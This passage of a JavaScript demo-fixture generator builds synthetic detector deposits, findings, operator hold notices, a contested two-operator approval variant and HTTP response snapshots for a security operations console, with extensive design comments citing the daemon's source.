const LANES_WITH_NO_DETECTOR = ["discovery"];

// ── the colony that actually runs ──────────────────────────────────────────
// Every registration site in the daemon binary, with the config key that gates
// it and the shipped default of that key. `register_persisted_runtime_agent`
// (crates/swarm-runtime-http/src/bin/swarm_detect.rs:241-271) loads a
// PersistedAgentIdentity whose `id` is `AgentId::from_verifying_key`
// (crates/swarm-runtime/src/agent_identity.rs:100-105) — so a running agent's
// id is `swarm:ed25519:{hex}` and NEVER `whisker-7a3f`. The role and the slot
// are carried beside it in ActiveAgentIdentityRecord, which is what a colony
// panel should render: role / slot / short key, three fields, no invented name.
//
// VERIFIED: `AgentId::new(role, short)` — the constructor that makes
// `whisker-7a3f`-shaped ids — has exactly THREE non-test callers in the whole
// Ambush workspace, all in crates/swarm-agents/src/tom_agent.rs (:702, :719,
// :763), all `unwrap_or_else` fallbacks filling
// `GovernanceDecision::Veto { governing_agent_id }` when no governor id is
// configured. The only role-named ids a running daemon can emit are therefore
// `tom-unconfigured` and `tom-partition`, and both mean a veto.
const COLONY = [
  { role: "whisker", slot: "primary", registered: true, gate: null, note: "unconditional (swarm_detect.rs:772-776)" },
  { role: "tom", slot: "primary", registered: true, gate: null, note: "unconditional (swarm_detect.rs:811-815)" },
  { role: "pouncer", slot: "primary", registered: true, gate: null, note: "unconditional (swarm_detect.rs:843-847)" },
  { role: "stalker", slot: "primary", registered: false, gate: "investigation.enabled", gate_default: false, note: "rulesets/default.yaml:174" },
  { role: "weaver", slot: "primary", registered: false, gate: "correlation.enabled", gate_default: false, note: "rulesets/default.yaml:182" },
  { role: "kitten", slot: "primary", registered: false, gate: "evolution.enabled", gate_default: false, note: "rulesets/default.yaml:214" },
  { role: "sphinx", slot: "primary", registered: false, gate: "memory.enabled", gate_default: false, note: "rulesets/default.yaml:315" },
  { role: "calico", slot: "primary", registered: false, gate: "deception.enabled", gate_default: false, note: "rulesets/default.yaml:274" },
].map((a) => ({
  ...a,
  agent_id: a.registered ? `swarm:ed25519:${IDS[`agent_${a.role}`]}` : null,
  public_key_hex: a.registered ? IDS[`agent_${a.role}`] : null,
  short: a.registered ? IDS[`agent_${a.role}`].slice(0, 8) : null,
}));

// ── background: the rest of the shift, on other hosts ──────────────────────
// Same replay lane as the story, so every deposit's agent_id is
// `{daemon ingest identity}:{strategy_id}` — the strategy-scoped form
// resolve_deposits writes (pipeline.rs:573). CONSEQUENCE, and it is the point:
// `distinct_agents` is 1 on EVERY lane, because a shipped daemon registers
// exactly one Whisker, at slot "primary", and there is no second slot anywhere
// in swarm_detect.rs. A wall drawn from this file shows "N sources / 1 agent"
// on every row. That is not a fixture limitation to design around; it is the
// shipped topology, and it is exactly the reading error render law 2 exists to
// prevent.
const BACKGROUND_HOSTS = [
  "host-ops-1", "host-ops-2", "bastion-1", "build-1", "dc-1", "mail-1", "wks-114",
];
const BG = (strategyId, threatClass, host, secondsAgo, confidence) => ({
  strategy_id: strategyId,
  event_id: `hunt-bg-${threatClass}-${strategyId}-${secondsAgo}`,
  timestamp: Math.floor(T.demo_now_ms / 1000) - secondsAgo,
  confidence,
  agent_id: `${DAEMON_AGENT_ID}:${strategyId}`,
  host_id: host,
  threat_class: threatClass,
});
// Every (strategy_id, threat_class) pair below is checked against
// DETECTOR_THREAT_CLASSES at the bottom of this block; an unreal pair throws.
const BACKGROUND_DEPOSITS = [
  BG("lateral_movement", "lateral_movement", "host-ops-2", 420, 0.72),
  BG("behavioral_anomaly", "lateral_movement", "bastion-1", 1500, 0.55),
  BG("dns_exfiltration", "data_exfiltration", "wks-114", 900, 0.68),
  BG("behavioral_anomaly", "data_exfiltration", "wks-114", 2400, 0.41),
  BG("network_connect", "command_and_control", "host-ops-2", 240, 0.83),
  BG("behavioral_anomaly", "command_and_control", "mail-1", 3300, 0.37),
  BG("credential_access", "credential_access", "dc-1", 1800, 0.61),
  BG("cloudtrail", "credential_access", "dc-1", 5400, 0.44),
  BG("persistence", "persistence", "build-1", 2700, 0.52),
  BG("fileless_execution", "defense_evasion", "build-1", 600, 0.47),
  BG("kubernetes_audit", "privilege_escalation", "build-1", 4200, 0.58),
  BG("supply_chain", "supply_chain", "build-1", 7200, 0.66),
  BG("cloudtrail", "initial_access", "dc-1", 6000, 0.39),
  BG("infrastructure_anomaly", "impact", "host-ops-2", 8100, 0.29),
];
for (const d of BACKGROUND_DEPOSITS) {
  const classes = DETECTOR_THREAT_CLASSES[d.strategy_id];
  if (!classes) throw new Error(`no such detector: ${d.strategy_id}`);
  if (!classes.includes(d.threat_class)) {
    throw new Error(`${d.strategy_id} cannot produce ${d.threat_class}`);
  }
}

// ── the twelve lanes, at the demo's now ────────────────────────────────────
// TWELVE is standard_threat_classes()'s own order. `execution` is the STORY's
// number (post-dismiss, because the demo's `now` is after beat 7); the other
// eleven come from BACKGROUND_DEPOSITS through the same concentration_for port.
const NOW_S = Math.floor(T.demo_now_ms / 1000);
const LANES = TWELVE.map((tc) => {
  const isStory = tc === "execution";
  const deposits = isStory
    ? DEPOSITS
    : BACKGROUND_DEPOSITS.filter((d) => d.threat_class === tc);
  const suppressed = isStory ? new Set(["hunt-evt-1"]) : new Set();
  const c = at(NOW_S, deposits, suppressed, tc);
  const agents = new Set(
    deposits
      .filter((d) => strengthAt(d, NOW_S) >= POLICY.evaporation_threshold && !suppressed.has(d.event_id))
      // The agent half of render law 2: drop the LAST colon-separated segment,
      // which resolve_deposits appended (pipeline.rs:573). Correct only under
      // the strategy-scoped mechanism, which is why the mechanism rides the wire.
      .map((d) => d.agent_id.split(":").slice(0, -1).join(":")),
  );
  return {
    threat_class: tc,
    source: isStory ? "story" : "background",
    total_strength: c.total_strength,
    distinct_sources: c.distinct_sources,
    distinct_agents: agents.size,
    peak_confidence: c.peak_confidence,
    exceeds_alert_threshold: exceeds(c),
    deposit_count: deposits.filter((d) => !suppressed.has(d.event_id)).length,
    // Render law 7: an empty lane is not the same fact as a quiet one.
    empty_reason: LANES_WITH_NO_DETECTOR.includes(tc)
      ? "no shipped detector emits this threat class"
      : (c.total_strength === 0 ? "no deposit above the evaporation floor" : null),
  };
});

// ── the three findings, with their served review state ─────────────────────
// review_state is what B3r (GET /v1/operator/findings/reviewed) serves. It is
// SERVED, never guessed: the console keeps a hint so a row paints instantly and
// snaps to the served answer with a visible reason when they disagree.
const FINDINGS = [
  { finding_id: "suspicious_process_tree:hunt-evt-1", strategy_id: "suspicious_process_tree", event_id: "hunt-evt-1", host_id: "host-ops-1", threat_class: "execution", severity: "CRITICAL", confidence: HIGH_CONFIDENCE, emitted_at_ms: T.finding_spt1_ms, review_state: "unreviewed", card_event_id: IDS.ev_finding_spt_1 },
  { finding_id: "suspicious_scripting:hunt-evt-1", strategy_id: "suspicious_scripting", event_id: "hunt-evt-1", host_id: "host-ops-1", threat_class: "execution", severity: "CRITICAL", confidence: HIGH_CONFIDENCE, emitted_at_ms: T.finding_scr1_ms, review_state: "dismissed", reviewed_at_ms: T.dismiss_applied_ms, card_event_id: IDS.ev_finding_scr_1 },
  { finding_id: "suspicious_process_tree:hunt-evt-2", strategy_id: "suspicious_process_tree", event_id: "hunt-evt-2", host_id: "host-ops-1", threat_class: "execution", severity: "CRITICAL", confidence: HIGH_CONFIDENCE, emitted_at_ms: T.finding_spt2_ms, review_state: "unreviewed", card_event_id: IDS.ev_finding_spt_2 },
];

// ── the four queues, at the demo's now ─────────────────────────────────────
// Headers are 04 §2.1's words. `named_you` is ABSENT, not zero: nothing in
// Ambush names a person, and OperatorAuthConfig::effective_principals
// synthesises exactly one principal in the shipped default, so there is no
// second party who could name the first. The distinction is load-bearing —
// render law 3's "0 promotions is correct by design and says so" is the same
// rule, and a zero here would be a claim that nobody named you today.
const QUEUE = {
  holds: { header: "Holds", present: true, rows: [IDS.hold_b], count: 1, note: "hold A left the queue when the daemon recorded the decision, by reconciliation against GET /v1/response/holds — never by a relay delete" },
  named_you: { header: "Named you", present: false, rows: [], count: null, absent_reason: "no operator directory exists in either tree; one principal is synthesised from config" },
  findings_to_review: { header: "Findings to review", present: true, rows: FINDINGS.filter((f) => f.review_state === "unreviewed").map((f) => f.finding_id), count: 2, reviewed_this_shift: 1, total_this_shift: 3 },
  case_activity: { header: "Case activity", present: true, rows: [IDS.case_channel], count: 1 },
};

// ── the C9 instrumentation strip ───────────────────────────────────────────
// UNMEASURED is a literal token, not a zero. The daemon's evidence window is
// `incident_store.recent(audit.recent_decisions_limit)` over an in-memory store
// (crates/swarm-core/src/config/storage.rs:63, :69-71; limit default 20 at
// config/defaults.rs:3-5), so a restart destroys every measurement ever
// written and a 0 would be indistinguishable from a quiet week.
const INSTRUMENTATION = {
  median_page_to_verdict_ms: null,
  median_page_to_verdict_state: "UNMEASURED",
  median_page_to_verdict_reason: "no client-side timing store exists yet; the daemon records no page-to-verdict interval",
  measurements_written_this_week: 1,
  measurements_store_durable: false,
  measurements_window_limit: 20,
  promoted: 0,
  did_not_clear_the_bar: 0,
  promotion_counter_state: "UNMEASURED",
  promotion_counter_reason: "the promoted/suppressed counter is ADR 0018 follow-on work; nothing increments it today",
  findings_reviewed_this_shift: 1,
  findings_total_this_shift: 3,
};

// ─────────────────────────────────────────────────────────────── the frames
// The frames are NOT envelopes: they are ephemeral 26xxx bodies, aggregates and
// opaque ids only (APPENDIX-NORMATIVE.md section 3).
const FRAMES = {
  "frame-26000-ingest-rate-0914": {
    kind: 26000, schema: "swarm.perch.frame.ingest_rate.v1", issuer: BRIDGE_ISSUER,
    seq: 1, emitted_at_ms: M("2026-03-17T09:14:33.000Z"), window_ms: 1000,
    accepted: 2, rejected: 0, by_source: { synthetic: 2 },
  },
  "frame-26001-concentration-below": {
    kind: 26001, schema: "swarm.perch.frame.concentration.v1", issuer: BRIDGE_ISSUER,
    seq: 2, emitted_at_ms: T.tick_below_ms, observed_at_seconds: T.tick_below_s,
    // APPENDIX-NORMATIVE.md section 3: coalesced 10 Hz -> 1 Hz IN THE BRIDGE,
    // before IPC. The ten ticks inside one second are byte-identical because
    // `now` is unix_timestamp_secs() (crates/swarm-runtime/src/escalation.rs:407-410).
    coalesced_from: 10,
    current_mode: "normal",
    concentrations: twelveClasses(CONC.below),
  },
  "frame-26001-concentration-crossing": {
    kind: 26001, schema: "swarm.perch.frame.concentration.v1", issuer: BRIDGE_ISSUER,
    seq: 10, emitted_at_ms: M("2026-03-17T09:14:42.000Z"), observed_at_seconds: T.cross_s,
    coalesced_from: 10, current_mode: "alert",
    concentrations: twelveClasses(CONC.crossing),
  },
  "frame-26001-concentration-after-dismiss": {
    kind: 26001, schema: "swarm.perch.frame.concentration.v1", issuer: BRIDGE_ISSUER,
    seq: 253, emitted_at_ms: T.tick_after_dismiss_ms, observed_at_seconds: T.tick_after_dismiss_s,
    coalesced_from: 10, current_mode: "alert",
    concentrations: twelveClasses(CONC.after_dismiss),
  },
  "frame-26002-agent-health": {
    kind: 26002, schema: "swarm.perch.frame.agent_health.v1", issuer: BRIDGE_ISSUER,
    seq: 3, emitted_at_ms: M("2026-03-17T09:14:33.100Z"),
    agents: [{
      agent_id: DAEMON_AGENT_ID, role: "whisker", from: "healthy", to: "healthy",
      changed_at_ms: SHIFT_START_MS, actions: { detect: 2, deposit: 3 },
    }],
  },
  "frame-26003-mode-transition": {
    kind: 26003, schema: "swarm.perch.frame.mode_transition.v1", issuer: BRIDGE_ISSUER,
    seq: 11, emitted_at_ms: T.mode_ms, from: "normal", to: "alert",
    triggering_threat_class: "execution",
    reason: "concentration crossed alert_threshold",
  },
  "frame-26004-governance-status": {
    kind: 26004, schema: "swarm.perch.frame.governance_status.v1", issuer: BRIDGE_ISSUER,
    seq: 12, emitted_at_ms: M("2026-03-17T09:14:42.000Z"),
    partition_state: "healthy", healthy_governors: 1, total_governors: 1, quorum_threshold: 1,
    active_contingency_leases: 0, contingency_lease_ttl_ms: CONTINGENCY_LEASE_TTL_MS,
    unauthorized_partition_actions: 0,
    last_transition_at_ms: null, last_reconciliation_report_id: null,
  },
  "frame-26005-tamper-alert": {
    kind: 26005, schema: "swarm.perch.frame.tamper_alert.v1", issuer: BRIDGE_ISSUER,
    seq: 1, emitted_at_ms: M("2026-03-17T09:14:42.050Z"),
    debugger_attached: false, tracer_pid: null, fail_closed: false,
    unexpected_library_count: 0,
    // sha256 over the newline-joined, lexicographically sorted path list. With
    // zero unexpected loads that list is empty, so this is sha256("") -- a real
    // value, not a placeholder, and the reason the frame's schema can keep the
    // field non-nullable and required.
    unexpected_library_sha256: "0x" + createHash("sha256").update("").digest("hex"),
  },
  "frame-26006-hold-alarm-a": {
    kind: 26006, schema: "swarm.perch.frame.hold_alarm.v1", issuer: BRIDGE_ISSUER,
    seq: 1, emitted_at_ms: T.alarm_a_ms, hold_id: IDS.hold_a, action_kind: "isolate_host",
    severity: "CRITICAL", case_channel: IDS.case_channel,
    expires_at_ms: T.hold_a_ms + PERCH_HOLD_TTL_MS,
  },
  "frame-26006-hold-alarm-b": {
    kind: 26006, schema: "swarm.perch.frame.hold_alarm.v1", issuer: BRIDGE_ISSUER,
    seq: 2, emitted_at_ms: T.alarm_b_ms, hold_id: IDS.hold_b, action_kind: "block_egress",
    severity: "CRITICAL", case_channel: IDS.case_channel,
    expires_at_ms: T.hold_b_ms + PERCH_HOLD_TTL_MS,
  },
};

// ───────────────────────────────────────────────────── the 46010 hold notices
// The QUEUE row. Content is a plain one-line summary because
// crates/buzz-relay/schema/schema.sql:223-227's search_tsv CASE excludes 46010,
// so nothing here is full-text searchable and the body is for humans only.
// NO `e` TAG: crates/buzz-relay/src/handlers/ingest.rs:2987-2997 gates
// resolve_nip10_thread_meta on requires_h_channel_scope, so once 46010 is
// channel-scoped an `e` tag would make the hold a NIP-10 reply, mutate
// reply_count/descendant_count on its root inside the insert transaction and
// emit a relay-signed kind:39005 (ingest.rs:3219-3226).
function holdNotice(holdId, action, holdMs, cardEventId, approvers = [IDS.operator_nostr_pubkey]) {
  return {
    kind: 46010,
    content: `hold ${holdId} · ${action.type} · CRITICAL · host-ops-1 · expires ${ISO(holdMs + PERCH_HOLD_TTL_MS)}`,
    // EXACTLY FOUR TAG NAMES: h, p, hold, card. 13-WIRE-SCHEMAS.md's KIND 46010
    // TAGS commitment closes the set and schemas/event-46010-hold-notice.schema.json
    // now enforces it through `items.prefixItems[0].enum`. An earlier draft of
    // this fixture also carried t / l / k; all three are single-letter, so the
    // relay writes each into the tag index on insert, widening the closed index
    // budget APPENDIX-NORMATIVE.md section 3 fixes at h/p/e/d — and they buy
    // nothing, because filter_fully_pushable sends #t/#l/#k to its default arm
    // (BUZZ crates/buzz-relay/src/handlers/req.rs:851-895) so a filter naming one
    // is post-filtered off a diluted page and loses the fast COUNT path. Index
    // cost, no query benefit.
    //
    // ONE `p` PER Approve-SCOPED PRINCIPAL. The shipped default synthesises
    // exactly one (OperatorAuthConfig::effective_principals,
    // AMB crates/swarm-core/src/config/operator.rs:153-168); the contested
    // variant below carries two, which is the only configuration in which two
    // consoles can legitimately hold the same hold.
    tags: [
      ["h", IDS.case_channel],
      ...approvers.map((pk) => ["p", pk]),
      ["hold", holdId],
      ["card", cardEventId],
    ],
  };
}


// ═══════════════════════════════════════════════════════════════════════════
// THE `contested` VARIANT — two consoles, one hold, one winner
//
// WHY IT EXISTS. APPENDIX-NORMATIVE.md section 4 layer 1 p-tags EVERY principal
// holding OperatorScope::Approve, and section 13's declined-amendment note
// confirms the watch claim does not narrow that set. So a deployment with two
// Approve principals legitimately delivers one hold to two consoles. Leg 1 is
// published to the relay BEFORE leg 2 is POSTed, the relay has no compare-and-
// set, and a kind:9 event is immutable — so BOTH signed intent cards land in the
// case channel and stay there forever. 12-BACKEND-BILL-API.md section 4.4
// resolves the daemon side (409 hold_already_deciding); the relay side is the
// LOSING console's obligation, because it is the only party that knows both
// which card it published and which 409 it got back.
//
// WHAT IT ADDS TO THE CAST, and this is the ONLY place the one-host rule bends:
// a second operator principal. No second host, no second incident, no third
// hold. It reuses hold B, which the base scenario deliberately leaves open.
//
// A surface loading the base fixture never sees any of this: it lives under
// `variants.contested` and nothing in `story` references it.
const CONTESTED_DECIDE_MS = T.demo_now_ms + 1200;
const CONTESTED_RATIONALE = "Blocking egress to 198.51.100.20 while we read the disk on host-ops-1.";

function contestedVerdictCard(label, { operatorId, operatorNostr, operatorVoter, signature, decidedAtMs, leg2 }) {
  return envelope(label, {
    schema: "swarm.perch.verdict.v1",
    issuer: { swarm_agent_id: operatorId, role: null, nostr_pubkey: operatorNostr },
    emitted_at_ms: decidedAtMs,
    locator: { hold_id: IDS.hold_b, case_channel: IDS.case_channel, hold_card_id: IDS.ev_hold_b_open },
    decision: {
      decision: "grant",
      hold_id: IDS.hold_b,
      operator_id: operatorId,
      decided_at_ms: decidedAtMs,
      rationale_sha256: rationaleSha256(CONTESTED_RATIONALE),
      rationale: CONTESTED_RATIONALE,
    },
    signature,
    leg2,
  }, decidedAtMs, { issuer: operatorVoter, stream: "verdict" });
}

// Operator 2 gets there first: the daemon's compare-and-set into `deciding`
// admits their nostr_intent_event_id, and their leg 2 returns 200.
const CONTESTED_OP2_WINS = contestedVerdictCard("contested-verdict-op2", {
  operatorId: "perch-operator-2",
  operatorNostr: IDS.operator2_nostr_pubkey,
  operatorVoter: `swarm:ed25519:${IDS.operator2_ed25519_pubkey}`,
  signature: {
    algorithm: "ed25519", key_id: "perch-operator-2",
    public_key_hex: IDS.operator2_ed25519_pubkey,
    signature_hex: IDS.operator2_ed25519_sig_grant_b,
  },
  decidedAtMs: CONTESTED_DECIDE_MS,
  leg2: { state: "acknowledged", receipt_id: `resp:hunt-evt-2:lease:hunt-evt-2:block_egress:${CONTESTED_DECIDE_MS}`, refusal_check: null, superseded_by: null, superseded_at_ms: null },
});

// Operator 1 published leg 1 four hundred milliseconds later and lost the CAS.
// The card is real, signed, and stays in the channel forever. Its FIRST state
// is `sending` — the same as any other leg 1, because at publish time it did
// not yet know it had lost.
const CONTESTED_OP1_LOSES = contestedVerdictCard("contested-verdict-op1", {
  operatorId: OPERATOR_ID,
  operatorNostr: IDS.operator_nostr_pubkey,
  operatorVoter: OPERATOR_VOTER_ID,
  signature: {
    algorithm: "ed25519", key_id: OPERATOR_ID,
    public_key_hex: IDS.operator_ed25519_pubkey,
    signature_hex: IDS.operator_ed25519_sig_grant_b,
  },
  decidedAtMs: CONTESTED_DECIDE_MS + 400,
  leg2: { state: "sending", receipt_id: null, refusal_check: null, superseded_by: null, superseded_at_ms: null },
});

// ...and then publishes the UPDATE card that qualifies it. `superseded` is the
// only leg2 state that carries a winner, and the schema's own oneOf makes
// `superseded_by` + `superseded_at_ms` required exactly there and null
// everywhere else — so a console cannot record "somebody else won" without
// saying who. Without this card the case channel and the Ledger export's
// holds/ directory hold two unqualified human-decision records for one hold and
// nothing marks the loser.
const CONTESTED_OP1_SUPERSEDED = contestedVerdictCard("contested-verdict-op1-superseded", {
  operatorId: OPERATOR_ID,
  operatorNostr: IDS.operator_nostr_pubkey,
  operatorVoter: OPERATOR_VOTER_ID,
  signature: {
    algorithm: "ed25519", key_id: OPERATOR_ID,
    public_key_hex: IDS.operator_ed25519_pubkey,
    signature_hex: IDS.operator_ed25519_sig_grant_b,
  },
  decidedAtMs: CONTESTED_DECIDE_MS + 700,
  leg2: {
    state: "superseded",
    receipt_id: null,
    refusal_check: null,
    superseded_by: IDS.ev_verdict_grant_op2,
    superseded_at_ms: CONTESTED_DECIDE_MS + 700,
  },
});

// The 409 that produces it. 12-BACKEND-BILL-API.md section 4.4: a decide POST
// against a hold already in a terminal state, carrying a DIFFERENT
// nostr_intent_event_id, is `hold_already_decided`. The body names the winning
// intent id, which is the only way the losing console can fill superseded_by.
const CONTESTED_409 = {
  schema_version: 1,
  error: "hold_already_decided",
  hold_id: IDS.hold_b,
  state: "executed",
  decided_at_ms: CONTESTED_DECIDE_MS,
  decided_by_operator_id: "perch-operator-2",
  decided_nostr_intent_event_id: IDS.ev_verdict_grant_op2,
  message: "another operator's decision was recorded first; this decision did not run",
};

// The two-principal 46010 for hold B. TWO `p` tags, one per Approve-scoped
// principal, which is what makes the contest possible in the first place.
const CONTESTED_NOTICE = holdNotice(
  IDS.hold_b, ACTION_B, T.hold_b_ms, IDS.ev_hold_b_open,
  [IDS.operator_nostr_pubkey, IDS.operator2_nostr_pubkey],
);

// ─────────────────────────────────────────────────────────── HTTP snapshots
function heldActionView(body, nowMs) {
  const { decision, ...rest } = body;
  return {
    ...rest,
    remaining_ms: Math.max(0, body.expires_at_ms - nowMs),
    expired: nowMs >= body.expires_at_ms,
    decision: decision ?? null,
  };
}

// The containment list is one of the two routes on this surface that ALREADY
// SHIP: containment_lease_list_handler is mounted at
// `GET /v1/operator/containment/leases`
// (AMB crates/swarm-runtime-http/src/http/containment.rs:263-266) behind
// require_bearer_auth, in the swarm_detect --serve process, and returns
// ContainmentLeaseListResponse { schema_version, observed_at_ms, open_leases }
// where each view is ContainmentLeaseView { lease, remaining_ms, expired }
// (:73-96). It is not a bill item and needs no B-label.
//
// TWO FIELDS, AND THE STRUCT'S OWN DOC COMMENT SAYS WHY: remaining_ms SATURATES
// AT ZERO (:78-81), so it alone cannot distinguish "expires in an instant" from
// "expired an hour ago and the sweep has not managed to release it" -- and
// release_lease deliberately KEEPS such a lease listed rather than abandoning a
// host that is still contained (:83-87). A single progress bar is therefore not
// a styling choice, it is a loss of the only field that answers the question an
// operator is actually asking.
const HTTP = {
  "GET-v1-operator-containment-leases.json": {
    schema_version: 1,
    observed_at_ms: T.demo_now_ms,
    open_leases: [{
      lease: CONTAINMENT_LEASE_RECORD,
      remaining_ms: Math.max(0, CONTAINMENT_LEASE_RECORD.expires_at_ms - T.demo_now_ms),
      expired: T.demo_now_ms >= CONTAINMENT_LEASE_RECORD.expires_at_ms,
    }],
  },
  "variant-contested-POST-v1-response-holds-hold-b-decide-409.json": CONTESTED_409,
  "GET-v1-response-holds.json": {
    schema_version: 1,
    observed_at_ms: T.demo_now_ms,
    holds: [heldActionView(HOLD_A_TERMINAL, T.demo_now_ms), heldActionView(HOLD_B_OPEN, T.demo_now_ms)],
    open_count: 1,
    truncated: false,
    // The shipped default. crates/swarm-core/src/config/storage.rs:63,:69-71.
    store_durable: false,
  },
  "GET-v1-response-holds-hold-b.json": {
    schema_version: 1, observed_at_ms: T.demo_now_ms, hold: heldActionView(HOLD_B_OPEN, T.demo_now_ms),
  },
  "POST-v1-response-holds-hold-a-decide.json": {
    schema_version: 1,
    hold_id: IDS.hold_a,
    state: "executed",
    decision: HOLD_A_DECISION,
    replayed: false,
    receipt: {
      receipt_id: RECEIPT_ID, action: "isolate_host", mode: "enforced", status: "executed",
      summary: "sandbox Enforced for isolate_host",
      details: { mode: "enforced", capability_id: CAPABILITY_LEASE.capability_id, scope: CAPABILITY_LEASE.scope, requested_by: DAEMON_AGENT_ID },
      audit: {
        policy: { verdict: "require_human", rule_name: "static.human_gate", reason: POLICY_DECISION.reason },
        approved_by: {
          operator_id: OPERATOR_ID, voter_id: OPERATOR_VOTER_ID, hold_id: IDS.hold_a,
          decided_at_ms: T.decide_ms, signature: HOLD_A_DECISION.signature,
          nostr_intent_event_id: IDS.ev_verdict_grant,
        },
      },
    },
    audit_trail_id: IDS.trail_a,
    containment_lease_id: IDS.containment_lease,
    capability_lease: CAPABILITY_LEASE,
  },
  "POST-v1-operator-incidents.json": {
    schema_version: 1,
    // crates/swarm-runtime/src/correlation.rs:110-233 --
    // `incident:{hunt_id}:{created_at_ms}`. B3i must mint the same shape.
    incident_id: `incident:hunt-evt-1:${T.incident_ms}`,
    created: true,
    degraded: [],
    record: {
      incident_id: `incident:hunt-evt-1:${T.incident_ms}`,
      summary: "Two Office-spawned PowerShell chains on host-ops-1",
      created_at_ms: T.incident_ms,
      window_start_ms: T.evt1_s * 1000,
      window_end_ms: T.evt2_s * 1000,
      trigger_event_id: "hunt-evt-1",
      trigger_finding_id: "suspicious_process_tree:hunt-evt-1",
      trigger_strategy_id: "suspicious_process_tree",
      threat_class: "execution",
      severity: "CRITICAL",
      // crates/swarm-runtime/src/providence.rs:838-841 -- extract_host_id_from_keys
      // resolves host_id ONLY from a key literally prefixed `host:`. Without it
      // HostExclusionReview is unreachable forever for this incident.
      correlation_keys: ["host:host-ops-1", "user:alice", "parent:winword", "parent:outlook"],
      // crates/swarm-runtime/src/providence.rs:799-836 -- resolve_feedback_target
      // fails unless included_members contains the finding_id.
      included_hunt_ids: ["hunt-evt-1", "hunt-evt-2"],
      included_members: [
        { investigation_id: "inv:hunt-evt-1", hunt_id: "hunt-evt-1", finding_id: "suspicious_process_tree:hunt-evt-1", reason: "seed investigation", shared_keys: ["host:host-ops-1"], evidence_links: [], confidence_score: 1.0 },
        { investigation_id: "inv:hunt-evt-1b", hunt_id: "hunt-evt-1", finding_id: "suspicious_scripting:hunt-evt-1", reason: "same telemetry event", shared_keys: ["host:host-ops-1"], evidence_links: [], confidence_score: 1.0 },
        { investigation_id: "inv:hunt-evt-2", hunt_id: "hunt-evt-2", finding_id: "suspicious_process_tree:hunt-evt-2", reason: "shared host and threat class inside the correlation window", shared_keys: ["host:host-ops-1", "user:alice"], evidence_links: [], confidence_score: 0.78 },
      ],
      rejected_members: [],
      related_receipt_ids: [],
      false_positive_measurements: [],
    },
  },
  "POST-v1-operator-findings-feedback-dismiss.json": {
    schema_version: 1,
    feedback_id: `perch-feedback:suspicious_scripting:hunt-evt-1:${IDS.ev_verdict_dismiss}`,
    action: "dismiss",
    incident_id: `incident:hunt-evt-1:${T.incident_ms}`,
    finding_id: "suspicious_scripting:hunt-evt-1",
    // Taken from AuthenticatedOperatorPrincipal, never from the body. B3.
    analyst_id: OPERATOR_ID,
    // crates/swarm-ingest-runtime/src/ingest/providence_handlers.rs:473-495 --
    // false_positive = matches!(action, Dismiss).
    false_positive: true,
    replayed: false,
    outcome: {
      substrate: { status: "suppressed", event_id: "hunt-evt-1", threat_class: "execution" },
      memory: { disposition: "recorded", feedback_id: `perch-feedback:suspicious_scripting:hunt-evt-1:${IDS.ev_verdict_dismiss}` },
    },
  },
  "GET-v1-operator-findings-reviewed.json": {
    schema_version: 1,
    observed_at_ms: T.demo_now_ms,
    reviewed: [{
      finding_id: "suspicious_scripting:hunt-evt-1",
      reviewed_at_ms: T.dismiss_applied_ms,
      action: "dismiss",
      analyst_id: OPERATOR_ID,
      false_positive: true,
      incident_id: `incident:hunt-evt-1:${T.incident_ms}`,
      strategy_id: "suspicious_scripting",
      host_id: "host-ops-1",
    }],
    // crates/swarm-core/src/config/defaults.rs:3-5 -- default_recent_decisions_limit() = 20.
    window_incident_count: 1,
    window_is_truncated: false,
    window_oldest_incident_at_ms: T.incident_ms,
    store_durable: false,
  },
  "GET-v1-operator-pheromone-deposits-execution.json": {
    schema_version: 1,
    now_seconds: S("2026-03-17T09:16:05Z"),
    threat_class: "execution",
    policy: POLICY,
    concentration: CONC.at_open_row,
    deposits: DEPOSITS.map((d) => ({
      event_id: d.event_id,
      threat_class: "execution",
      severity: "CRITICAL",
      confidence: d.confidence,
      timestamp: d.timestamp,
      decay_half_life: POLICY.half_life_secs,
      agent_id: d.agent_id,
      // infer_agent_role returns None for a `swarm:ed25519:` id
      // (crates/swarm-runtime/src/detection/pipeline.rs:583-604).
      agent_role: null,
      agent_identity: "",
      host_id: d.host_id,
      strategy_id: d.strategy_id,
      strength_at_now: round6(strengthAt(d, S("2026-03-17T09:16:05Z"))),
    })),
    suppressed: [],
    truncated: false,
  },
  "GET-v1-operator-pheromone-deposits-execution-after-dismiss.json": {
    schema_version: 1,
    now_seconds: T.tick_after_dismiss_s,
    threat_class: "execution",
    policy: POLICY,
    concentration: CONC.after_dismiss,
    deposits: DEPOSITS.filter((d) => d.event_id !== "hunt-evt-1").map((d) => ({
      event_id: d.event_id, threat_class: "execution", severity: "CRITICAL", confidence: d.confidence,
      timestamp: d.timestamp, decay_half_life: POLICY.half_life_secs, agent_id: d.agent_id,
      agent_role: null, agent_identity: "", host_id: d.host_id, strategy_id: d.strategy_id,
      strength_at_now: round6(strengthAt(d, T.tick_after_dismiss_s)),
    })),
    suppressed: [{
      event_id: "hunt-evt-1",
      threat_class: "execution",
      // crates/swarm-ingest-runtime/src/ingest/providence_handlers.rs:534 --
      // the marker deposit's `timestamp` is recorded_at_ms, i.e. MILLISECONDS,
      // while every detector deposit is event-time SECONDS. See 22-DEMO-FIXTURE.md
      // finding F-4: the comparison at substrate.rs:1378 is therefore always true.
      marker_timestamp: T.dismiss_applied_ms,
      removed_deposit_count: 2,
      analyst_id: OPERATOR_ID,
    }],
    truncated: false,
  },
};

// ─────────────────────────────────────────────────────────────────── emit
const CARDS = {
  "card-01-finding-suspicious-process-tree-evt1": findingCard("finding-spt-1", {
    strategyId: "suspicious_process_tree", eventId: "hunt-evt-1", evidence: EVIDENCE.spt1, emittedMs: T.finding_spt1_ms }),
  "card-02-finding-suspicious-scripting-evt1": findingCard("finding-scr-1", {
    strategyId: "suspicious_scripting", eventId: "hunt-evt-1", evidence: EVIDENCE.scr1, emittedMs: T.finding_scr1_ms }),
  "card-03-finding-suspicious-process-tree-evt2": findingCard("finding-spt-2", {
    strategyId: "suspicious_process_tree", eventId: "hunt-evt-2", evidence: EVIDENCE.spt2, emittedMs: T.finding_spt2_ms }),
  "card-04-escalation-execution-alert": escalationCard(),
  "card-05-hold-a-isolate-host-open": holdCard("hold-a-open", IDS.hold_a, IDS.ev_finding_spt_1, HOLD_A_OPEN, T.hold_a_ms),
  "card-06-hold-b-block-egress-open": holdCard("hold-b-open", IDS.hold_b, IDS.ev_finding_spt_2, HOLD_B_OPEN, T.hold_b_ms),
  "card-07-verdict-grant-hold-a": verdictGrantCard(),
